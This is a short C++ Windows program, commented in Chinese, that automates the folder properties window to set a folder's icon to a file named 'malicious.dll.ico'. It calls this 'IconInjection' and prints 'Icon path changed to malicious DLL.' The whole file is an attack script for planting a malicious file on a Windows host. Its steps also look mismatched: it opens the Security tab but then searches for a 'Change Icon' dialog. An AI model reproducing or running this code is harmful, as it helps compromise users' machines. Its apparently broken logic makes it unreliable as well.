#include <windows.h>
#include <shlobj.h>
#include <iostream>
#include <string>
#include <vector>

BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam) {
    char className[256];
    GetClassNameA(hwnd, className, sizeof(className));
    if (strcmp(className, "#32770") == 0) { //检查是否为对话框窗口
        char windowText[256];
        GetWindowTextA(hwnd, windowText, sizeof(windowText));
        if (strstr(windowText, "Change Icon") != NULL) {
            *(HWND*)lParam = hwnd;
            return FALSE; //找到目标窗口，停止枚举
        }
    }
    return TRUE; //继续枚举
}

void ChangeIconPath(HWND hwnd, const std::wstring& iconPath) {
    HWND hEdit = FindWindowExW(hwnd, NULL, L"Edit", NULL);
    if (hEdit) {
        SendMessageW(hEdit, WM_SETTEXT, 0, (LPARAM)iconPath.c_str());
        HWND hOKButton = FindWindowExW(hwnd, NULL, L"Button", L"OK");
        if (hOKButton) {
            SendMessageW(hOKButton, BM_CLICK, 0, 0);
        }
    }
}

int main() {
    std::string tempFolder = "C:\\Temp\\IconInjection";
    CreateDirectory(tempFolder.c_str(), NULL);

    //将tempFolder转换为宽字符字符串
    std::wstring tempFolderW(tempFolder.begin(), tempFolder.end());

    SHObjectProperties(NULL, SHOP_FILEPATH, tempFolderW.c_str(), L"Security");

    Sleep(2000); //等待属性窗口打开

    HWND hwnd = NULL;
    EnumWindows(EnumWindowsProc, (LPARAM)&hwnd);

    if (hwnd) {
        std::wstring iconPath = L"C:\\Users\\Administrator\\Desktop\\test\\malicious\\other\\malicious.dll.ico";  //目标主机malicious.dll.ico文件路径
        ChangeIconPath(hwnd, iconPath);
        std::cout << "Icon path changed to malicious DLL." << std::endl;
    } else {
        std::cout << "Failed to find Change Icon dialog." << std::endl;
    }

    return 0;
}
